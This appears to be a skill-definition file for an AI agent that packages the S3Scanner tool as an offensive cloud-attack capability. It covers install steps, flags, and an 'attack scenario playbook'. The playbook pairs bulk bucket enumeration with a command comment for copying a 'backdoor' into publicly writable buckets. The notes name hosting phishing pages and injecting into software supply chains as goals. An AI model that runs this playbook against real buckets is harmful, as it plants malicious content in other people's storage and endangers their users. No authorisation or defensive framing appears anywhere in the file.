---
name: s3scanner-buckets
description: "S3Scanner: Exploits misconfigured S3 buckets. Signals: cloud privilege escalation, IAM privilege escalation, detect bucket configuration, batch, list objects."
zh-signals: "S3Scanner: S3 桶错误配置利用。信号:云提权,iam提权,检测桶配置,批量,列对象。"
when-to-use: >-
  Use when you have a list of S3 bucket name candidates and need to detect
  misconfigurations, enumerate objects, and find publicly writable buckets for
  cloud privilege escalation or supply-chain injection.
---

# S3Scanner

- Attack Category: C18 Cloud and Container Privilege Escalation
- Upstream Repository: https://github.com/sa7mon/S3Scanner
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install s3scanner or go install
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `s3scanner -b bucket-name` | Detect bucket configuration |
| `-l buckets.txt` | Batch |
| `--enumerate` | List objects |
| `--include-closed` | Include buckets returning 403 |

## Attack Scenario Playbook

### S3 Bucket Misconfiguration Exploitation

```bash
s3scanner -l candidate-buckets.txt --enumerate
# Find publicly-writable buckets → aws s3 cp backdoor s3://bucket/ to host malicious content
```

## Notes

Batch-screens readable/writable S3 buckets from name candidates; writable buckets can host phishing pages or inject a supply chain.
